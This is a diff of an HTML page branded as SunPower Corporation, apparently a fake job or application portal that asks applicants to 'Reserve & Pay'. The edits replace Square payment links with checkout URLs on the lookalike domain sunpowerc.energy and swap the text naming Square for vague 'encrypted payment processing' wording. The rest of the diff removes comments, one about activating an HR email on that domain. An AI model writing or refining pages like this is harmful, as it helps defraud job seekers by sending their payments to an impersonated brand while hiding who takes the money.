@@ -181,11 +181,15 @@
       <input type="text" required>
     </div>
 
-    <a class="pay-btn" href="https://square.link/u/rQTpIlWx" target="_blank">
+    <a class="pay-btn" 
+       href="https://checkout.sunpowerc.energy/checkouts/do/e22d3c8723c666478d2e9c4cc59452c7/en-us"
+       target="_blank">
       Reserve & Pay
     </a>
 
-    <div class="secure-note">Secure payment processed by Square</div>
+    <div class="secure-note">
+      Secure checkout · Encrypted payment processing
+    </div>
   </form>
 </section>
 
@@ -211,7 +215,9 @@
       <input type="text" id="coId">
     </div>
 
-    <a class="pay-btn" href="https://square.link/u/WqXjxpmq" target="_blank">
+    <a class="pay-btn" 
+       href="https://checkout.sunpowerc.energy/checkouts/do/045eab609bc677b5f8919ed8a57d2080/en-us"
+       target="_blank">
       Reserve & Pay
     </a>
 
@@ -234,7 +240,7 @@
     </div>
 
     <div class="secure-note">
-      Payments redirect to Square. All transactions are encrypted.
+      Secure checkout · Encrypted payment processing
     </div>
   </form>
 </section>
@@ -250,17 +256,14 @@
 
 <footer class="footer">
   ©️ 2026 SunPower Corporation · 
-  <!-- ACTIVACIÓN CORREO HR -->
   <a href="mailto:hr@sunpowerc.energy">hr@sunpowerc.energy</a>
 </footer>
 
 <script>
-  // FLOW CONTROL
   if (localStorage.getItem("applicationCompleted") !== "true") {
     window.location.href = "index.html";
   }
 
-  // CO-APPLICANT LOGIC
   const coCode = document.getElementById("coCode");
   const finalizeBtn = document.getElementById("finalizeBtn");
   const coName = document.getElementById("coName");
